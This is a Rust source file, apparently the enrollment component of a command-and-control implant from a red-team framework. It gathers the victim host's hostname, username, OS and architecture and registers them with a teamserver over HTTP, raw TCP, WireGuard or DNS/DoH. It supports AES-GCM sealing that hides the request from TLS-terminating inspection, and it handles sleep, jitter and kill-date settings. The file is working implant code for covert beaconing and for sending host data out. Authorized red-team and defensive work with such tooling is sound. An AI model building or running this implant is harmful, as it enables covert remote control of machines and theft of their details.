use base64::Engine;
use p256::ecdsa::{SigningKey, VerifyingKey};
use p256::pkcs8::EncodePublicKey;
use rand::rngs::OsRng;
use serde::Serialize;

use crate::envelope;
use crate::profile::Profile;
use crate::transport;
use crate::trust::{self, Certificate};

// The enroll client: the JSON body contract the web route carries
// (camelCase keys, base64 certificate material), with the bake's envelope
// shaping applied as the wire contract defines it. The keypair exists to
// enroll: nothing after enroll signs with it (no transport re-proves
// possession), so only the public half is kept.

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct EnrollBody<'a> {
    deploy_token_secret: &'a str,
    public_key: String,
    hostname: String,
    os: &'a str,
    arch: &'a str,
    username: String,
    sleep_seconds: f64,
    jitter_seconds: f64,
    #[serde(skip_serializing_if = "Option::is_none")]
    kill_date: Option<&'a str>,
}

pub struct Enrollment {
    pub implant_id: String,
    pub engagement_id: String,
    pub ca_chain: Vec<Certificate>,
}

pub struct KeyPair {
    pub verifying: VerifyingKey,
}

impl KeyPair {
    pub fn generate() -> KeyPair {
        let signing = SigningKey::random(&mut OsRng);
        KeyPair {
            verifying: *signing.verifying_key(),
        }
    }

    /// The public half as a DER SubjectPublicKeyInfo, base64 over JSON --
    /// exactly what the teamserver reads back via ImportSubjectPublicKeyInfo.
    pub fn public_spki_base64(&self) -> String {
        base64::engine::general_purpose::STANDARD.encode(self.public_spki_der())
    }

    /// The same SubjectPublicKeyInfo as raw DER: the frame grammar's enroll
    /// carries certificate material as bytes, not text.
    pub fn public_spki_der(&self) -> Vec<u8> {
        self.verifying
            .to_public_key_der()
            .expect("SPKI export")
            .as_bytes()
            .to_vec()
    }
}

/// Enrolls against one enroll URL; Err carries the refusal cause for the
/// walk's log. Transport errors and definitive refusals are distinguished by
/// the caller's retry policy (a definitive refusal ends the run).
pub fn enroll(url: &str, profile: &Profile, keys: &KeyPair) -> Result<Enrollment, String> {
    let body = EnrollBody {
        deploy_token_secret: &profile.token,
        public_key: keys.public_spki_base64(),
        hostname: hostname(),
        os: std::env::consts::OS,
        arch: std::env::consts::ARCH,
        username: username(),
        sleep_seconds: profile.sleep_seconds,
        jitter_seconds: profile.jitter_seconds,
        kill_date: profile.kill_date.as_deref(),
    };
    let json = serde_json::to_string(&body).map_err(|e| e.to_string())?;

    // The bake's envelope shaping: AES-GCM seals the JSON under the baked key
    // (the body stays opaque even where TLS terminates early), base64 wraps
    // it, raw sends the JSON document. The exact strings the teamserver's
    // enroll decode unwraps.
    let payload = match profile.envelope.as_str() {
        "aesgcm" => {
            let (key_id, key) = envelope::parse_baked_key(&profile.envelope_key)
                .ok_or("aesgcm envelope baked with no usable key")?;
            format!(
                "\"{}\"",
                String::from_utf8(envelope::seal_contact_body(
                    json.as_bytes(),
                    &key_id,
                    &key,
                    envelope::ENROLL_AAD
                ))
                .map_err(|_| "sealed body")?
            )
        }
        "base64" => format!(
            "\"{}\"",
            base64::engine::general_purpose::STANDARD.encode(json.as_bytes())
        ),
        _ => json,
    };

    let agent = transport::build_agent(url, profile, profile.request_timeout_seconds);
    let response = transport::apply_headers(
        agent.post(url).set("Content-Type", "application/json"),
        profile,
    )
    .send_string(&payload)
    .map_err(|e| format!("enroll transport: {e}"))?;
    let status = response.status();
    let text = response
        .into_string()
        .map_err(|e| format!("enroll read: {e}"))?;
    if status != 200 && status != 401 {
        return Err(format!("enroll transport: status {status}"));
    }

    // Both the OK and the refusal bodies answer as plain JSON: the envelope
    // shapes the request only -- the answer never rides sealed on the web
    // route.
    let answer: serde_json::Value = serde_json::from_slice(text.as_bytes())
        .map_err(|_| "enroll answer was not valid JSON".to_string())?;
    let status_value = answer
        .get("status")
        .and_then(serde_json::Value::as_i64)
        .unwrap_or(0);
    if status_value != 1 {
        return Err(format!("enroll rejected: status {status_value}"));
    }

    // The leaf field carries the not-supplied shape (no in-tree family
    // mints transport certificates); the CA chain is the answer's substance:
    // it carries the tasking signer.
    let mut ca_chain = Vec::new();
    if let Some(chain) = answer.get("caChain").and_then(serde_json::Value::as_array) {
        for entry in chain {
            let Some(text) = entry.as_str() else { continue };
            if let Ok(der) = base64::engine::general_purpose::STANDARD.decode(text) {
                if let Some(cert) = trust::parse_der(&der) {
                    ca_chain.push(cert);
                }
            }
        }
    }

    Ok(Enrollment {
        implant_id: answer
            .get("implantId")
            .and_then(serde_json::Value::as_str)
            .unwrap_or_default()
            .to_string(),
        engagement_id: answer
            .get("engagementId")
            .and_then(serde_json::Value::as_str)
            .unwrap_or_default()
            .to_string(),
        ca_chain,
    })
}

/// The enroll dispatcher the run walk calls: the socket family's fronts
/// (tcp://) enroll over their own stream contact, the WireGuard family's
/// (wg://) over its tunnel, everything else over the web route's JSON
/// body. Error prefixes stay the walk's vocabulary.
pub fn enroll_any(url: &str, profile: &Profile, keys: &KeyPair) -> Result<Enrollment, String> {
    if url.starts_with("tcp://") {
        return enroll_over_socket(url, profile, keys);
    }
    #[cfg(feature = "wireguard")]
    if url.starts_with("wg://") {
        return crate::transport::wireguard::enroll_over_wireguard(url, profile, keys);
    }
    if url.starts_with("dns://") || url.starts_with("doh://") {
        return crate::transport::dns::enroll_over_dns(url, profile, keys);
    }
    enroll(url, profile, keys)
}

/// Enrolls over the socket family's stream contact (architecture.md Sec 8,
/// the full-independence step): the opening message carries the EnrollRequest
/// frame -- the web route's JSON body promoted into the frame grammar -- and
/// the answer arrives as an EnrollResponse frame on its own message. Sealed
/// under the bake's key with the socket exchange's own purpose tags when the
/// bake carries one; plaintext otherwise (the certificate-less posture).
fn enroll_over_socket(url: &str, profile: &Profile, keys: &KeyPair) -> Result<Enrollment, String> {
    use prost::Message;

    let rest = url.strip_prefix("tcp://").unwrap_or(url);
    let authority = rest.split('/').next().unwrap_or(rest);
    let mut stream = std::net::TcpStream::connect(authority)
        .map_err(|e| format!("enroll transport: dial {authority}: {e}"))?;
    stream.set_nodelay(true).ok();

    let request = wire_enroll_request(profile, keys);
    let frames = crate::wire::encode(&[crate::wire::Frame {
        payload: request.encode_to_vec(),
        kind: crate::wire::FrameKind::EnrollRequest as i32,
    }]);
    let body = match envelope::parse_baked_key(&profile.envelope_key) {
        Some((key_id, key)) if profile.contact_envelope == "aesgcm" => {
            envelope::seal_contact_body(&frames, &key_id, &key, envelope::SOCKET_ENROLL_REQUEST_AAD)
        }
        _ => frames,
    };
    transport::rawtcp::write_message(&mut stream, &body)
        .map_err(|e| format!("enroll transport: {e}"))?;

    let response = transport::rawtcp::read_message(&mut stream, false)
        .ok()
        .flatten()
        .ok_or_else(|| "enroll read: the socket closed before the answer".to_string())?;
    let plain = match envelope::parse_baked_key(&profile.envelope_key) {
        Some((key_id, key)) if profile.contact_envelope == "aesgcm" => {
            envelope::try_open_contact_body(
                &response,
                &key_id,
                &key,
                envelope::SOCKET_ENROLL_RESPONSE_AAD,
            )
            .ok_or_else(|| "enroll answer did not verify under the baked key".to_string())?
        }
        _ => response,
    };
    let frames = crate::wire::parse(&plain)
        .ok_or_else(|| "enroll answer was not valid framing".to_string())?;
    let answer = frames
        .iter()
        .find(|frame| frame.kind() == crate::wire::FrameKind::EnrollResponse)
        .and_then(|frame| crate::wire::EnrollResponse::decode(frame.payload.as_ref()).ok())
        .ok_or_else(|| "enroll answer carried no EnrollResponse frame".to_string())?;
    enrollment_from_response(answer)
}

/// The enroll request every frame-speaking carriage sends: the web route's
/// JSON fields promoted into the proto, host facts and cadence included.
/// One constructor so the socket and DNS exchanges report a machine
/// identically.
pub(crate) fn wire_enroll_request(profile: &Profile, keys: &KeyPair) -> crate::wire::EnrollRequest {
    crate::wire::EnrollRequest {
        deploy_token_secret: profile.token.clone(),
        class: String::new(),
        public_key: keys.public_spki_der(),
        parent_implant_id: String::new(),
        hostname: hostname(),
        os: std::env::consts::OS.to_string(),
        arch: std::env::consts::ARCH.to_string(),
        username: username(),
        kill_date: profile.kill_date.clone().unwrap_or_default(),
        sleep_seconds: Some(profile.sleep_seconds),
        jitter_seconds: Some(profile.jitter_seconds),
    }
}

/// The accepted-answer mapping every frame-speaking carriage runs: refusal
/// by status, the CA chain parsed as the enrollment's substance.
pub(crate) fn enrollment_from_response(
    answer: crate::wire::EnrollResponse,
) -> Result<Enrollment, String> {
    if answer.status != crate::wire::rod::EnrollStatus::Ok as i32 {
        return Err(format!("enroll rejected: status {}", answer.status));
    }
    let ca_chain = answer
        .ca_chain
        .iter()
        .filter_map(|der| trust::parse_der(der))
        .collect();
    Ok(Enrollment {
        implant_id: answer.implant_id,
        engagement_id: answer.engagement_id,
        ca_chain,
    })
}

fn hostname() -> String {
    if cfg!(windows) {
        std::env::var("COMPUTERNAME").unwrap_or_else(|_| "unknown".into())
    } else {
        std::fs::read_to_string("/etc/hostname")
            .map(|h| h.trim().to_string())
            .ok()
            .filter(|h| !h.is_empty())
            .or_else(|| std::env::var("HOSTNAME").ok())
            .unwrap_or_else(|| "unknown".into())
    }
}

fn username() -> String {
    if cfg!(windows) {
        std::env::var("USERNAME").unwrap_or_default()
    } else {
        std::env::var("USER").unwrap_or_default()
    }
}
